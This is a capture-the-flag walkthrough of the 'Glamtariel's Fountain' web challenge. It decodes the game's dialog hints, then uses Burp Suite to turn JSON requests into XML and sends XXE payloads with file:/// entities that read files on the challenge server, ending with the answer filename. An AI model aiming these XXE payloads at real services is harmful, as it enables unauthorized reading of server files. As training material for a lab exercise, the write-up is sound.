# Glamtariel's Fountain

!!! summary "Glamtariel's Fountain<br>*Difficulty*: :fontawesome-solid-tree:{: style="color: red;"}:fontawesome-solid-tree:{: style="color: red;"}:fontawesome-solid-tree:{: style="color: red;"}:fontawesome-solid-tree:{: style="color: red;"}:fontawesome-solid-tree:{: style="color: red;"}"
    Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.




## Hints and Resources

??? hint "Hint from Hal Tandybuck after completing Part 1 of the <a href="../09_Open_the_Boria_Mine_Door/">Boria Mine Door</a>"
    **Significant Case**<br>
    Early parts of this challenge can be solved by focusing on Glamtariel's WORDS.

??? hint "Hint from Hal Tandybuck after completing Part 2 of the <a href="../09_Open_the_Boria_Mine_Door/">Boria Mine Door</a>"
    **eXternal Entities**<br>
    Sometimes we can hit web pages with <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XXE</a> when they aren't expecting it!

??? hint "Other Resources"
    **Guide on XXE Injection**<br>
    <a href="https://www.hackingarticles.in/comprehensive-guide-on-xxe-injection/">https://www.hackingarticles.in/comprehensive-guide-on-xxe-injection/</a><br>
    <br>
    **Burp Suite Community Edition**<br>
    <a href="https://portswigger.net/burp/communitydownload">https://portswigger.net/burp/communitydownload</a>


## Setup

Clicking on the fountain opens the web site <a href="https://glamtarielsfountain.com/">https://glamtarielsfountain.com/</a> in a separate tab / window.  The answer is submitted in your badge, so this challenge can be completed directly from this link at any time.

When the web site opens it can be a little unclear what you are actually supposed to do.  Each page of the site will have two main elements.

* The Princess
* The Fountain

Additionally, there will be 4 objects that can be clicked and dragged onto either the princess or the fountain.  Depending on which one is dragged where, the princess and the fountain will tell you different things.  It's also possible to drop an object onto neither the princess or the fountain, but this will result in the same dialog no matter which object it is.

The starting page has the following objects.

* Santa
* Candy Cane
* Elf
* Ice Cube

All 9 dialog options for the first set of objects are provided in the table below.

| Object | Dropped On | Princess | Fountain |
| ------ | ---------- | -------- | -------- |
| any | empty space | Some that are silver may never shine<br>Some who wander may get lost<br>All that are curious will eventually find<br>What others have thrown away and tossed | From water and cold new ice will form<br>Frozen spires from lakes will arise<br>Those shivering who weather the storm<br>Will learn from how the TRAFFIC FLIES |
| Santa | Princess | I don't know why anyone would ever ask me to TAMPER with the cookie recipe. I know just how Kringle likes them. | Glamtariel likes to keep Kringle happy so that he and the elves will visit often |
| Santa | Fountain | Kringle really likes the cookies here so I always make them the same way | Kringle really dislikes it if anyone tries to TAMPER with the cookie recipe Glamtariel uses. |
| Candycane | Princess | Mmmmm, I love Kringlish Delight! | I think Glamtariel is thinking of a different story. |
| Candycane | Fountain | I think fountain gets confused about things sometimes. | Zany Zonka makes the best of these! |
| Ice Cube | Princess | No worries, it doesn't get nearly as cold here as it did in Melgarexa. Brrrr, that was one frigid trip. | I think it's a perfect temperature here. |
| Ice Cube | Fountain | It's always great when old friends visit! | Hey, its Chilly Icycube, my old friend! I remember when they were but a small drop in the Dimrofel. |
| Elf | Princess | I helped the elves to create the PATH here to make sure that only those invited can find their way here | I wish the elves visited more often. |
| Elf | Fountain | I don't get away as much as I used to. I think I have one last trip in me which I've probably put off for far too long. | The elves do a great job making PATHs which are easy to follow once you see them. |

Focusing on some of the dialog and especially the words in CAPS, we can deduce the following information from this first set of dialogs.

* TRAFFIC FLIES likely refers to us watching the web traffic to the site, implying that this will be necessary to complete the challenge
* Several references to TAMPER are made, with warnings that Santa would not like it if someone tampered with the Princesses cookie recipe.  This is a hint that tampering with the site cookies is not advisable, and is in fact unnecessary to complete the challenge.
* PATH is telling us that at some point in the challenge we need to determine a directory path or similar

After completing the first 8 dialog options, a new set of objects are provided

* Green Ring
* Igloo
* Ice Boat
* Star

This time 8 dialog options are available, as the star gives the same regardless of which object it's dropped on.

| Object | Dropped On | Princess | Fountain |
| ------ | ---------- | -------- | -------- |
| any | empty space | Some that are silver may never shine<br>Some who wander may get lost<br>All that are curious will eventually find<br>What others have thrown away and tossed | From water and cold new ice will form<br>Frozen spires from lakes will arise<br>Those shivering who weather the storm<br>Will learn from how the TRAFFIC FLIES |
| Green Ring | Princess | I do have a small ring collection, including one of these. | I think Glamtariel likes rings a little more than she lets on sometimes. |
| Green Ring | Fountain | Careful with the fountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed! | Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPointed. Please click away that ominous eye! |
| Igloo | Princess | It's understandable to wonder about home when one is adventuring. | I think I'd worry too much if I ever left this place.|
| Igloo | Fountain | The fountain shows many things, some more helpful than others. It can definitely be a poor guide for decisions sometimes. | What's this? Fake tickets to get in here? Snacks that don't taste right? How could that be? |
| Ice Boat | Princess | These ice boat things would have been helpful back in the day. I still remember when Boregoth stole the Milsarils, very sad times. | I'm glad I wasn't around for any of the early age scuffles. I shudder just thinking about the stories. |
| Ice Boat | Fountain | Did you know that I speak in many TYPEs of languages? For simplicity, I usually only communicate with this one though. | I pretty much stick to just one TYPE of language, it's a lot easier to share things that way. |
| Star | either | O Frostybreath Kelthonial<br>shiny stars grace the night<br>from heavens on high! | Up and far many look<br>away from glaciers cold.<br>To Phenhelos they sing<br>here in Kringle's realm! |

Note that when the Green Ring is dropped on the Fountain an eye appears in the middle of the screen which must be clicked to dismiss before anything else can be done.  This has no effect or relevance that I could find on the rest of the challenge.

The second page of dialogs tell us the following

* Again, we are told that we should look at how the TRAFFIC FLIES.  This must be important.
* The princess mentions that she has a green ring in her collection.
* Again we are told that a PATH is involved, but this time along with an APP, inferring an application path of some sort.
* The fountain can be a poor guide for decisions
* The princess can speak in different TYPES of languages
* The fountain only uses one TYPE of language

After completing this second set of dialogs, you will get the final page of the site with the last set of objects

* Two Blue Rings
* Silver Ring
* Red Ring

| Object | Dropped On | Princess | Fountain |
| ------ | ---------- | -------- | -------- |
| Blue or Silver Ring | empty space | These are kind of special, please don't drop them just anywhere | These are kind of special, please don't drop them just anywhere | 
| Red Ring | empty space | This is no small trinket, please don't drop it just anywhere | This is no small trinket, please don't drop it just anywhere | 
| Blue Ring | Princess | I love these fancy blue rings! You can see I have two of them. Not magical or anything, just really pretty. | If asked, Glamtariel definitely tries to insist that the blue ones are her favorites. I'm not so sure though. |
| Blue Ring | Fountain | I like to keep track of all my rings using a SIMPLE FORMAT, although I usually don't like to discuss such things. | Glamtariel can be pretty tight lipped about some things. |
| Silver Ring | Princess | Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file. Wait a minute! Uh, promise me you won't tell anyone. | I never heard Glamtariel mention a RINGLIST file before. If only there were a way to get a peek at that. |
| Silver Ring | Fountain | You know what one of my favorite songs is? Silver rings, silver rings .... | Glamtariel may not have one of these silver rings in her collection, but I've overheard her talk about how much she'd like one someday. |
| Red Ring | Princess | Ah, the fiery red ring! I'm definitely proud to have one of them in my collection. | I think Glamtariel might like the red ring just as much as the blue ones, perhaps even a little more. |
| Red Ring | Fountain | Hmmm, you seem awfully interested in these rings. Are you looking for something? I know I've heard through the ice cracks that Kringle is missing a special one. | You know, I've heard Glamtariel talk in her sleep about rings using a different TYPE of language. She may be more responsive about them if you ask differently. |

From this last set of dialog we learn the following

* The princes keeps track of her rings in a RINGLIST that uses a SIMPLE FORMAT.
* The princess has 2 blue rings
* The princess has a red ring
* The princess doesn't have a silver ring in here collection, but she wants one.
* If we ask the princess about rings using a different TYPE of language, we may be more responsive.

## Solution

Starting from one of the first clues, we want to watch the web traffic as we interact with the site.  Stating Burp Suite we learn that every time an object is moved a POST request is sent to the /dropped URL, sending data using the JSON Content Type.

``` json
{
    "imgDrop":"img1",
    "who":"princess",
    "reqType":"json"
}
```

Some experimentation tells us that img1 is the top right object, img2 is the top left, img3 is the bottom right, and img4 is the bottom left.

There was numerous mentions of TYPE in the dialogs, with indications that the princess can understand more than one.  HTML POST requests can format the information submitted using several Content Types, but the most common are JSON and XML.  We see from the data in the POST that it is using JSON, but what if we send the same data using the XML format?

To do this, send the POST request to the Burp repeater, and modify it as follows.

* Change the Content-Type in the header to application/xml
* Change the content to the XML format
``` xml
<?xml version="1.0" encoding="UTF-8" ?>
<root>
  <imgDrop>img1</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```

Inspecting the response packet we see different dialog from both the princess and the fountain.

| Object | Dropped On | Princess | Fountain |
| ------ | ---------- | -------- | -------- |
| any | princess | I love rings of all colors! | She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though. |
| any | fountain | I'm one of the few who can discuss anything using that TYPE of language. | Yeah, I can understand a bit, but not communicate with it at all. |

The only thing we really learn from this is that the princess understands XML.

Referring back to the hint from Hal Tandybuck, XML External Entity (XXE) Processing seems to be an option.  This technique allows us to reference some external entity in our XML input, such as files on the local system.  We've learned that an APP PATH is involved, and there is a RINGFILE in a SIMPLE FORMAT, so if we can deduce the name of a file we may be able to retrieve it using XXE.

Looking at the web traffic again we see that image files representing the objects on the site that we can interact with are located in the directory `/static/images`.  If we deduce that the web application is in a directory called APP, and that the file is RINGFILE.TXT, then the local file we want to access is `/app/static/images/ringfile.txt`.

The following XML will use XXE to send this file to the princess.

``` xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root[  
	<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt">
]>
<root>
  <imgDrop>&xxe;</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```

| Object | Dropped On | Princess | Fountain |
| ------ | ---------- | -------- | -------- |
| xxe | princess | Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this. | She really does try to keep things safe. Best just to put it away. (click) |


In addition to the above dialog, we also have a value in the previously unused 'visit' property, telling us to go to `https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png,262px,100px`, where we get the following image.  

![](pholder-morethantopsupersecret63842.png)

This image references two files in the folder `x_phial_pholder_2022`, `bluering.txt` and `redring.txt`.

Next we use XXE to "give" these rings to the princess.

``` xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root[  
	<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt">
]>
<root>
  <imgDrop>&xxe;</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```

| Object | Dropped On | Princess | Fountain |
| ------ | ---------- | -------- | -------- |
| bluering.txt| princess | I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty. | She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though. |

Note that this is the same dialog from when we dropped a blue ring on the princess though the web UI.  Next, try the red ring.

``` xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root[  
	<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/redring.txt">
]>
<root>
  <imgDrop>&xxe;</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```

| Object | Dropped On | Princess | Fountain |
| ------ | ---------- | -------- | -------- |
| redring.txt| princess | Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice. | Oooooh, I can just tell she'd like to talk about them some more. |

Not quite the same dialog as when we dropped the red ring on the princess through the web UI, but the fountain is encouraging us to continue.

Remembering that the princess wants a silver ring, lets see if we can give her one.

``` xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root[  
	<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt">
]>
<root>
  <imgDrop>&xxe;</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```

| Object | Dropped On | Princess | Fountain |
| ------ | ---------- | -------- | -------- |
| silverring.txt| princess | I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!. | Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum! |

We also now have another value in the 'visit' property, telling us to go to `https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px`, where we get the following image.

![](redring-supersupersecret928164.png)

Zooming in on this and rotating it we see the text `goldring_to_be_deleted.txt`, so we now give that to the princess.

``` xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root[  
	<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">
]>
<root>
  <imgDrop>&xxe;</imgDrop>
  <who>princess</who>
  <reqType>xml</reqType>
</root>
```

| Object | Dropped On | Princess | Fountain |
| ------ | ---------- | -------- | -------- |
| goldring_to_be_deleted.txt| princess | Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them. | She's definitely hiding something. | 

The princess tells us here that she thought we were going to give her the silver ring.  She also makes reference to a REQ and TYPE.  Noting that reqType is one of the parameters in the POST content, and the silver ring is image #1 on the web page, we create the following XML request.

``` xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root[  
	<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">
]>
<root>
  <imgDrop>img1</imgDrop>
  <who>princess</who>
  <reqType>&xxe;</reqType>
</root>
```

| Object | Dropped On | Princess | Fountain |
| ------ | ---------- | -------- | -------- |
| silverring.txt| princess | No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations! | Wow, I have never seen that before! She must really trust you! |

Along with the above dialog, we get the following URL reference in the 'visit' parameter.
`https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px`

![](goldring-morethansupertopsecret76394734.png)

??? success "Answer"
    `goldring-morethansupertopsecret76394734.png`